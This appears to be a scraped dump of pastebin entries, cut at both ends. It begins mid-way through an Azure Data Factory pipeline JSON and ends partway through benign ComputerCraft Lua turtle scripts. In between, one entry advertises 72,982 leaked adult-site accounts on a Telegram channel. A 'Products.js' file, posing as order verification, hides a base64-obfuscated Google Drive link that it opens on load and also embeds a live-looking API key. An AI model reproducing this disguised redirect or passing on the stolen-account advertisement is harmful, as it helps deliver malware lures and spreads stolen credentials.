                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SBDPRD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDSRD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SBDSRD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDPBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PRDPBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDSBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PRDSBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDPBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SRDPBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDSBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SRDSBD_WIP_Variance"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDPRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PBDPRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PBDSRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PBDSRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDPRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SBDPRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SBDSRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SBDSRD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDPBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PRDPBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PRDSBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PRDSBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDPBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SRDPBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""SRDSBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""SRDSBD_FinancePriorWeek_WIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Renegotiated_Matter"",
                                    ""type"": ""Boolean"",
                                    ""physicalType"": ""bit""
                                },
                                ""sink"": {
                                    ""name"": ""Renegotiated_Matter"",
                                    ""type"": ""Boolean"",
                                    ""physicalType"": ""bit""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FinanceEvergreenCode"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""FinanceEvergreenCode"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Evergreen_Description"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""Evergreen_Description"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Region"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""Region"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Split Matter"",
                                    ""type"": ""Boolean"",
                                    ""physicalType"": ""bit""
                                },
                                ""sink"": {
                                    ""name"": ""Split Matter"",
                                    ""type"": ""Boolean"",
                                    ""physicalType"": ""bit""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MatterTaxYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MatterTaxYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Billable Hours"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 5,
                                    ""precision"": 16
                                },
                                ""sink"": {
                                    ""name"": ""Billable Hours"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 5,
                                    ""precision"": 16
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Total Hours"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 5,
                                    ""precision"": 16
                                },
                                ""sink"": {
                                    ""name"": ""Total Hours"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 5,
                                    ""precision"": 16
                                }
                            }
                        ],
                        ""typeConversion"": true,
                        ""typeConversionSettings"": {
                            ""allowDataTruncation"": true,
                            ""treatBooleanAsNumber"": false
                        }
                    }
                },
                ""inputs"": [
                    {
                        ""referenceName"": ""AzureSynapseAnalyticsMatterDetail"",
                        ""type"": ""DatasetReference""
                    }
                ],
                ""outputs"": [
                    {
                        ""referenceName"": ""SqlServerFinRep"",
                        ""type"": ""DatasetReference""
                    }
                ]
            }
        ],
        ""annotations"": []
    }
}"
H2EpkC43,Chaturbate with Tokens,Xp_Isolation,JavaScript,Thursday 1st of May 2025 11:28:37 AM CDT,72982 Accounts Posted On https://t.me/leakzbyeminem
36nEKNER,Products.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 11:28:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08038/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7JSmmcFp,Untitled,Hackerno64,JSON,Thursday 1st of May 2025 11:21:01 AM CDT,"{
  ""status"": ""online"",
  ""approved"": {
    ""bcde5c3a4375056703ba1207df4e30c6"": {
      ""username"": ""Kittu Don 2"",
      ""expiry"": ""2025-12-31""
    }
  },
  ""message"": ""Tool is under maintenance.""
}"
7xS0NN36,FancyRemote,Sedrowow,Lua,Thursday 1st of May 2025 11:20:58 AM CDT,"-- turtle_remote.lua
os.loadAPI(""flex.lua"")

local modem_channel = 8464 -- Use the same channel as your receive_pocket.lua
local turtle_channel = 6464 -- The channel the turtle is listening on (from flex_options.cfg or default)

local modem
local p = flex.getPeripheral(""modem"")
if #p > 0 then
    modem = peripheral.wrap(p[1])
    modem.open(modem_channel)
else
    print(""Please attach a wireless or ender modem"")
    sleep(2)
    return
end

local turtle_status = {} -- Table to store the last received status from the turtle

local function displayStatus()
    term.clear()
    term.setCursorPos(1, 1)

    print(""--- Turtle Status ---"")
    if next(turtle_status) == nil then
        print(""Waiting for status update..."")
    else
        print(""Fuel: "" .. tostring(turtle_status.fuel))
        print(""Position: X="" .. tostring(turtle_status.position.x) .. "", Y="" .. tostring(turtle_status.position.y) .. "", Z="" .. tostring(turtle_status.position.z))
        print(""Mining: "" .. tostring(turtle_status.is_mining))
        print(""Estimated Time: "" .. tostring(turtle_status.estimated_time))

        print(""\nInventory:"")
        if next(turtle_status.inventory) == nil then
            print(""  Empty"")
        else
            for slot, item in pairs(turtle_status.inventory) do
                print(""  Slot "" .. tostring(slot) .. "": "" .. item.name .. "" ("" .. tostring(item.count) .. "")"")
            end
        end
    end

    print(""\n--- Commands ---"")
    print(""Press S to Refresh Status"")
    print(""Press U to Force Unload"")
    print(""Press Q to Quit"")
end

local function sendCommand(command_type)
    local command_message = {
        type = ""command"",
        command = command_type
    }
    modem.transmit(modem_channel, turtle_channel, command_message)
end

-- Initial status request
sendCommand(""status_request"")

while true do
    displayStatus()

    local event, param = os.pullEvent(""key"" or ""modem_message"")

    if event == ""key"" then
        local key_code = param
        if key_code == keys.s then
            sendCommand(""status_request"")
        elseif key_code == keys.u then
            sendCommand(""unload_command"")
        elseif key_code == keys.q then
            break -- Exit the loop
        end
    elseif event == ""modem_message"" then
        local modemSide, senderChannel, replyChannel, message, senderDistance = param, select(2, os.pullEvent()), select(3, os.pullEvent()), select(4, os.pullEvent()), select(5, os.pullEvent())

        -- Check if the message is from the expected turtle (optional but recommended)
        -- You might need to send the turtle's ID with its status updates

        if type(message) == ""table"" and message.type == ""status"" then
            turtle_status = message
        elseif type(message) == ""table"" and message.type == ""ack"" then
            print(""\nCommand '"" .. message.command .. ""' acknowledged."")
            sleep(1) -- Show acknowledgment message briefly
        end
    end
end

modem.close(modem_channel)
term.clear()
term.setCursorPos(1, 1)"
A9kSCq70,FancyReciever,Sedrowow,Lua,Thursday 1st of May 2025 11:19:53 AM CDT,"-- Program to receive messages from computers/
-- turtles using flex.lua ""send"" function


--------------------------------------
-- |¬Ø\|¬Ø¬Ø]¬†/¬Ø]|¬Ø¬Ø][¬Ø¬Ø]\\  //|¬Ø¬Ø]|¬Ø\¬†--
-- |¬†/|¬†]¬†|¬†[¬†|¬†]¬†¬†][¬†¬†\\//¬†|¬†]¬†| /¬†--
-- |¬†\|__]¬†\_]|__][__]¬†¬†\/¬†¬†|__]| \¬†--
--------------------------------------

local log_file = ""log.txt""
local options_file = ""flex_options.cfg""
os.loadAPI(""flex.lua"")
local modem_channel = 6464


if fs.exists(options_file) then
 local file = fs.open(""flex_options.cfg"", ""r"")
 local line = file.readLine()
 while line ~= nil do
  if string.find(line, ""modem_channel="") == 1 then
   modem_channel = tonumber( string.sub(
         line, 15, string.len(line) ) )
   break
  end --if
  line = file.readLine()
 end --while
 file.close()
end --if


local modem
local p = flex.getPeripheral(""modem"")
if #p > 0 then
 modem = peripheral.wrap(p[1])
 modem.open(modem_channel)
else
 flex.printColors(""Please attach a wireless""
   .."" or ender modem\n"", colors.red)
 sleep(2)
 return
end --if/else

local monitor
p = flex.getPeripheral(""monitor"")
if #p > 0 then
 monitor = peripheral.wrap(p[1])
 term.redirect(monitor)
 monitor.clear()
 monitor.setCursorPos(1,1)
 monitor.setTextScale(0.5)
end --if
local lcd_x,lcd_y = monitor.getSize()


local file, line
local filelist = {}
if fs.exists(log_file) then
 file = fs.open(log_file, ""r"")
 line = file.readLine()
 
 while line ~= nil do
 
  if line ~= """" or ( line == """" and
     filelist[#filelist] ~= """" ) then
   filelist[#filelist+1] = line
  end --if
  
  line = file.readLine()
 end --while
 file.close()
 file = fs.open(log_file, ""a"")
 
else
 -- Log file does not exist: make one!
 file = fs.open(log_file, ""w"")
 
end --if/else


local x, y
y = math.max(1,#filelist-lcd_y)
for x=y, #filelist do
 flex.printColors(filelist[x])
end --for

if filelist[#filelist] ~= """" then
 file.writeLine("""")
end --if
file.close()


term.setTextColor(colors.white)
print(""Waiting for message on channel ""
      ..tostring(modem_channel)..""..."")

while true do
 local event, modemSide, senderChannel,
    replyChannel, message, senderDistance =
    os.pullEvent(""modem_message"")
 
 file = fs.open(log_file, ""a"")
 file.writeLine(message)
 file.close()
 
 flex.printColors(message)
 
 sleep(0.01)
end --while

"
9yfBYMeU,FancyStairs,Sedrowow,Lua,Thursday 1st of May 2025 11:19:09 AM CDT,"-- Digs a staircase around a quarry
-- Run ""stairs help""
-- Or dig a staircase to bedrock
-- Run ""stairs""
-- <Flexico64@gmail.com>
-- Please email me if you have any
-- bugs or suggestions!

-----------------------------------
-- ¬†/¬Ø\¬†¬†||¬†||¬†¬†/\¬†¬†|¬Ø\¬†|¬Ø\¬†\\//¬†--
-- |¬†O¬†|¬†||_||¬†|¬†¬†|¬†|¬†/¬†|¬†/¬†¬†\/¬†¬†--
-- ¬†\_\\¬†¬†\__|¬†||||¬†|¬†\¬†|¬†\¬†¬†||¬†¬†--
-----------------------------------
--¬†/¬Ø¬Ø\¬†[¬Ø¬Ø]¬†¬†/\¬†¬†[¬Ø¬Ø]¬†|¬Ø\¬†/¬Ø¬Ø\¬† --
--¬†\_¬Ø\¬†¬†||¬†¬†|¬†¬†|¬†¬†][¬†¬†|¬†/¬†\_¬Ø\¬† --
--¬†\__/¬†¬†||¬†¬†||||¬†[__]¬†|¬†\¬†\__/¬† --
-----------------------------------

-- Names of tools
local name_torch = {
   ""torch"", ""lantern"", ""lamp"", ""light"" }
local name_bench = {
   ""minecraft:crafting_table"",
   ""forge:workbench"" }
local name_chest = { ""chest"" }
local name_box = {
   ""shulker_box"", ""travelersbackpack"" }


-- Stair blocks crafting material
local name_cobble = {
  ""minecraft:cobblestone"",
  ""forge:cobblestone"" }


-- Side that swaps with crafting bench
local tool_side = ""none""
if not peripheral.find(""workbench"") then
 tool_side = ""left""
 if peripheral.getType(""left"") == ""modem"" then
  tool_side = ""right""
 end --if
end --if


-- Load APIs
os.loadAPI(""flex.lua"")
os.loadAPI(""dig.lua"")
dig.setFuelSlot(1)
dig.setBlockSlot(2)
dig.setBlockStacks(4)


function dump()
 local slot = turtle.getSelectedSlot()
 local keepers = { name_cobble, name_box,
    name_torch, name_bench, name_chest,
    ""stairs"" }
 local x,a = 0,false

 for x=1,16 do
  if flex.isItem(name_box,x) then
   turtle.select(x)
   a = turtle.placeUp()
   break
  end --if
 end --for

 if not a then
  keepers[#keepers+1] = ""diamond""
  keepers[#keepers+1] = ""ancient_debris""
 end --if

 local blocksPresent = dig.getBlockStacks()
 for x=4,16 do
  if not flex.isItem(keepers,x) then
   if dig.isDumpItem(x) then
    if blocksPresent <= 0 then
     turtle.drop()
    else
     blocksPresent = blocksPresent - 1
    end --if/else
   else
    turtle.select(x)
    if a then
     turtle.dropUp()
    else
     turtle.drop()
    end --if/else
   end --if/else
  end --if
 end --for

 turtle.select(slot)
 if a then turtle.digUp() end
 dig.checkBlocks()
 flex.condense()
end --function



-- Program parameter(s)
local args={...}

-- Tutorial, kind of
if #args > 0 and args[1] == ""help"" then
 flex.printColors(""Place just to the ""..
   ""left of a turtle quarrying the same ""..
   ""dimensions."",colors.lightBlue)
 flex.printColors(""Include a crafting ""..
   ""table and a chest in turtle's ""..
   ""inventory to auto-craft a staircase"",
   colors.yellow)
 flex.printColors(""Usage: stairs ""..
   ""[length] [width] [depth]"",colors.pink)
 return
end --if


-- What Goes Where
flex.printColors(""Slot 1: Fuel\n""..
  ""Slot 2: Blocks\nSlot 3: Torches\n""..
  ""Anywhere: Crafting Bench, Chest\n""..
  ""Optional: Shulker Box / Backpack"",
  colors.lightBlue)
flex.printColors(""Press Enter"",
  colors.pink)
while flex.getKey() ~= keys.enter do
 -- Handle remote commands during waiting
 local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
 if event == ""modem_message"" then
     local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
     if type(message) == ""table"" and message.type == ""command"" then
         if message.command == ""status_request"" then
             local status = {
                 type = ""status"",
                 fuel = turtle.getFuelLevel(),
                 inventory = dig.getInventory(),
                 position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                 is_mining = false, -- Not actively building stairs yet
                 estimated_time = ""Waiting for user input..."" -- Placeholder
             }
             modem.transmit(flex.modem_channel, replyChannel, status)
         elseif message.command == ""unload_command"" then
             flex.send(""Received unload command while waiting, initiating unload..."", colors.yellow)
             dig.dropNotFuel()
             flex.send(""Unload complete."", colors.lightBlue)
             modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
         end
     end
 end
 if event ~= ""key"" then sleep(0.1) end -- Prevent tight loop if no event
end --while


-- Convert Inputs
local dx,dy,dz,n,x,y,z
local height = 5
dz = tonumber(args[1]) or 256
dx = tonumber(args[2]) or dz
dy = tonumber(args[3]) or 256
-- -1 to match Quarry depth


--------------------------------------
-- |¬Ø\¬†[¬Ø¬Ø]¬†/¬Ø¬Ø]¬†/¬Ø¬Ø][¬Ø¬Ø]|\¬†||¬†/¬Ø¬Ø]¬†--
-- |¬† |¬†][¬†|¬†[¬Ø||¬†[¬Ø|¬†][¬†|¬†\¬†||¬†[¬Ø|¬†--
-- |_/¬†[__]¬†\__|¬†\__|[__]||¬†\|¬†\__|¬†--
--------------------------------------

flex.send(""Digging staircase..."",
  colors.yellow)

-- Staircase Digging Functions

local torchNum = 9

function placeTorch()
 turtle.select(3)
 if flex.isItem(name_torch) then

  if not turtle.place() then
   if not dig.fwd() then return false end
   turtle.select(2)
   dig.place()
   if not dig.back() then return false end

   turtle.select(3)
   if not dig.place() then
    if not dig.fwd() then return false end
    turtle.select(2)
    dig.placeUp()
    if not dig.back() then return false end
    turtle.select(3)
    dig.place()
   end --if/else
  end --if
 end --if

 turtle.select(2)
end --function


function stepDown()
 local x

 turtle.select(2)
 dig.right()
 for x=1,height-2 do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()

 dig.left()
 dig.blockLava()
 dig.left()
 if not dig.fwd() then return false end
 dig.blockLavaUp()
 dig.blockLava()
 dig.right()
 dig.blockLava()
 dig.left()

 if torchNum >= 3 then
  if not dig.back() then return false end
  placeTorch()
  if not dig.down() then return false end
  if not dig.fwd() then return false end
  torchNum = 0
 else
  dig.blockLava()
  if not dig.down() then return false end
  torchNum = torchNum + 1
 end --if/else

 for x=1,height-2 do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end

 dig.right(2)
 if not dig.fwd() then return false end
 dig.blockLava()
 if not dig.placeDown() then return false end
 dig.left()

 if turtle.getItemCount(16) > 0 then
  dig.left()
  dump()
  dig.right()
 end --if/else

 if not dig.fwd() then return false end

 return true
end --function


local function turnRight()
 turtle.select(2)
 dig.right()
 if not dig.up(height-2) then return false end
 dig.blockLavaUp()

 dig.left()
 if not dig.down() then return false end
 if not dig.fwd() then return false end
 dig.blockLavaUp()
 for x=1,height-3 do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end

 dig.left()
 if not dig.fwd() then return false end
 for x=1,height-3 do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()

 dig.right()
 for x=1,height-3 do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end

 dig.left(2)
 if not dig.fwd() then return false end
 dig.right()
 if not dig.placeDown() then return false end
 for x=1,height-2 do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()

 dig.right(2)
 if not dig.fwd() then return false end
 if not dig.down(height-1) then return false end
 if not dig.placeDown() then return false end
 dig.left()
 if not dig.fwd() then return false end
 dig.blockLava()
 if not dig.placeDown() then return false end
 if not dig.back() then return false end
 dig.right()
 if not dig.fwd() then return false end

 torchNum = torchNum + 1
 return true
end --function


function endcap(h,stop)
 stop = ( stop ~= nil )
 h = h or 0 -- Height to dig layer
 local x

 dig.right()
 if not dig.placeDown() then return false end
 dig.checkBlocks()
 for x=1,height-2-h do
  dig.blockLava()
  if not dig.up() then return false end
 end --for
 dig.blockLava()
 dig.blockLavaUp()

 dig.left(2)
 if not dig.fwd() then return false end
 dig.blockLavaUp()
 for x=1,height-2-h do
  dig.blockLava()
  if not dig.down() then return false end
 end --for
 dig.blockLava()
 if not dig.placeDown() then return false end
 dig.checkBlocks()
 if not dig.back() then return false end

 dig.right()

 if stop then
  dig.blockLava()
  for x=1,height-2-h do
   if not dig.up() then return false end
   dig.blockLava()
  end --for
  dig.blockLavaUp()
  dig.left()

  if not dig.fwd() then return false end
  dig.blockLavaUp()
  dig.right()
  dig.blockLava()
  for x=1,height-2-h do
   if not dig.down() then return false end
   dig.blockLava()
  end --for

  dig.left()
  if not dig.back() then return false end
  dig.right()

 end --if

 return true
end --function



local direction

function avoidBedrock()
 if dig.isStuck() then
  -- Hit Bedrock/Void
  if dig.getStuckDir() == ""fwd"" then
   dig.up()
   dig.placeDown()
   dig.checkBlocks()
   dig.setymin(dig.gety())
   dig.fwd()
  elseif dig.getStuckDir() == ""down"" then
   dig.setymin(dig.gety())
  end --if
 end --if

 -- Get X and Z on the inner stair block
 if dig.getx() >= dx+2 then
  dig.gotox(dx+1)

 elseif dig.getx() <= -1 then
  dig.gotox(0)

 end --if/else

 if dig.getz() >= dz+1 then
  dig.gotoz(dz)

 elseif dig.getz() <= -2 then
  dig.gotoz(-1)

 end --if/else

 dig.gotor(direction)
 dig.gotoy(dig.getymin())
end --function



-- Start Digging

turtle.select(2)

x = 0
direction = dig.getr()
while true do
 -- Handle remote commands during digging
 local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
 if event == ""modem_message"" then
     local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
     if type(message) == ""table"" and message.type == ""command"" then
         if message.command == ""status_request"" then
             -- Estimate remaining steps/levels (simple for stairs)
             local total_depth = dy -- Assuming dy is the target depth
             local current_y = dig.gety()
             local estimated_remaining_levels = math.max(0, current_y - dig.getymin()) -- Simplified estimate

             local estimated_time_display = ""Calculating...""
             if estimated_remaining_levels > 0 then
                 -- Very rough time estimate based on remaining levels and average time per step
                 local avg_time_per_level = 30 -- Calibrate this value based on your turtle's performance
                 local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                 local hours = math.floor(estimated_time_seconds / 3600)
                 local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                 local seconds = math.floor(estimated_time_seconds % 60)
                 estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
             end

             local status = {
                 type = ""status"",
                 fuel = turtle.getFuelLevel(),
                 inventory = dig.getInventory(),
                 position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                 is_mining = true, -- Actively building stairs
                 estimated_time = estimated_time_display
             }
             modem.transmit(flex.modem_channel, replyChannel, status)
         elseif message.command == ""unload_command"" then
             flex.send(""Received unload command, initiating unload..."", colors.yellow)
             dig.dropNotFuel()
             flex.send(""Unload complete."", colors.lightBlue)
             modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
         end
     end
 end
 if event ~= nil then sleep(0.1) end -- Prevent tight loop if no event

 for n=0,dz-1 do
  if not stepDown() then break end
  x = x + 1
  if x >= dy then break end
  -- Handle remote commands during steps
  local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
  if event == ""modem_message"" then
      local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
      if type(message) == ""table"" and message.type == ""command"" then
          if message.command == ""status_request"" then
              local total_depth = dy
              local current_y = dig.gety()
              local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

              local estimated_time_display = ""Calculating...""
              if estimated_remaining_levels > 0 then
                  local avg_time_per_level = 30
                  local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                  local hours = math.floor(estimated_time_seconds / 3600)
                  local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                  local seconds = math.floor(estimated_time_seconds % 60)
                  estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
              end

              local status = {
                  type = ""status"",
                  fuel = turtle.getFuelLevel(),
                  inventory = dig.getInventory(),
                  position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                  is_mining = true,
                  estimated_time = estimated_time_display
              }
              modem.transmit(flex.modem_channel, replyChannel, status)
          elseif message.command == ""unload_command"" then
              flex.send(""Received unload command, initiating unload..."", colors.yellow)
              dig.dropNotFuel()
              flex.send(""Unload complete."", colors.lightBlue)
              modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
          end
      end
  end
 end
 if dig.isStuck() or x >= dy then break end
 if not turnRight() then break end
 x = x + 1
 -- Handle remote commands after turning
 local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
 if event == ""modem_message"" then
     local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
     if type(message) == ""table"" and message.type == ""command"" then
         if message.command == ""status_request"" then
             local total_depth = dy
             local current_y = dig.gety()
             local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

             local estimated_time_display = ""Calculating...""
             if estimated_remaining_levels > 0 then
                 local avg_time_per_level = 30
                 local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                 local hours = math.floor(estimated_time_seconds / 3600)
                 local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                 local seconds = math.floor(estimated_time_seconds % 60)
                 estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
             end

             local status = {
                 type = ""status"",
                 fuel = turtle.getFuelLevel(),
                 inventory = dig.getInventory(),
                 position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                 is_mining = true,
                 estimated_time = estimated_time_display
             }
             modem.transmit(flex.modem_channel, replyChannel, status)
         elseif message.command == ""unload_command"" then
             flex.send(""Received unload command, initiating unload..."", colors.yellow)
             dig.dropNotFuel()
             flex.send(""Unload complete."", colors.lightBlue)
             modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
         end
     end
 end


 direction = dig.getr()
 for n=0,dx-1 do
  if not stepDown() then break end
  x = x + 1
  if x >= dy then break end
  -- Handle remote commands during steps
   local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
   if event == ""modem_message"" then
       local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
       if type(message) == ""table"" and message.type == ""command"" then
           if message.command == ""status_request"" then
               local total_depth = dy
               local current_y = dig.gety()
               local estimated_remaining_levels = math.max(0, current_y - dig.getymin())

               local estimated_time_display = ""Calculating...""
               if estimated_remaining_levels > 0 then
                   local avg_time_per_level = 30
                   local estimated_time_seconds = estimated_remaining_levels * avg_time_per_level
                   local hours = math.floor(estimated_time_seconds / 3600)
                   local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                   local seconds = math.floor(estimated_time_seconds % 60)
                   estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
               end

               local status = {
                   type = ""status"",
                   fuel = turtle.getFuelLevel(),
                   inventory = dig.getInventory(),
                   position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                   is_mining = true,
                   estimated_time = estimated_time_display
               }
               modem.transmit(flex.modem_channel, replyChannel, status)
           elseif message.command == ""unload_command"" then
               flex.send(""Received unload command, initiating unload..."", colors.yellow)
               dig.dropNotFuel()
               flex.send(""Unload complete."", colors.lightBlue)
               modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
           end
       end
   end
 end
 if dig.isStuck() or x >= dy then break end
 if not turnRight() then break end
 x = x + 1
 -- Handle remote commands after turning
  local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
  if event == ""modem_message"" then
      local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
      if type(message) == ""table"" and message.type == ""command"" then
          if message.command == ""status_request"" then
